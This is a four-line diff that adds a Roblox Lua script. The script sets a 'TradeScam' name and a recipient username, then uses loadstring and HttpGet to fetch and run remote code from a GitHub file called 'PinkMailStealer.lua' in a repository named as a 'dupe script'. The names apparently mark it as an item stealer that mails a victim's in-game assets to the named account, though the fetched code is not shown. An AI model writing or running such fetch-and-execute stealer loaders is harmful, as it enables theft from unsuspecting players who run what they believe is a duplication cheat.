@@ -1,0 +1,4 @@
+_G.Name = "TradeScam loading credits Olisek"
+_G.Username = "olisektegoat"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
